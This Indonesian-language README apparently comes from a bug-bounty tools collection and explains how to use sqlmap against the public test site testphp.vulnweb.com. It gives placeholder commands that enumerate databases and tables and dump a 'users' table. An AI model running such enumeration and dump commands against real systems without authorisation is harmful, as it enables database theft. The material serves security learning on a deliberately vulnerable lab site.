# sqlmap
Tool ini digunakan untuk melakukan exploitasi kerentanan SQL Injection. Tool ini sudah tersedia secara otomatis di kali linux

- Link download dan instalasi: https://github.com/sqlmapproject/sqlmap

## Contoh Penggunaan
- Dokumentasi penggunaan tool sqlmap dapat dilihat dengan perintah berikut
```sh
sqlmap -h
```

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%201.JPG)

- Pengujian dilakukan pada web http://testphp.vulnweb.com
- Melihat seluruh database
```sh
sqlmap -u url --dbs
```

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%202.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%203.JPG)

- Melihat database saat ini
```sh
sqlmap -u url --current-db
```

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%204.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%205.JPG)

- Ditemukan 2 buah database pada hasil proses diatas. Sekarang kita coba lihat daftar tabel di salah satu database
```sh
sqlmap -u url -D database --tables
```

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%206.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%207.JPG)

- Ditemukan tabel `users` dari hasil proses diatas. Sekarang kita coba lihat isi tabel `users`
```sh
sqlmap -u url -D database -T tabel --dump
```

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%208.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%209.JPG)

- Hasil dump data otomatis tersimpan dalam sebuah file

![alt text](https://github.com/rahardian-dwi-saputra/bugbounty-tools/blob/main/assets/sqlmap/sqlmap%2010.JPG)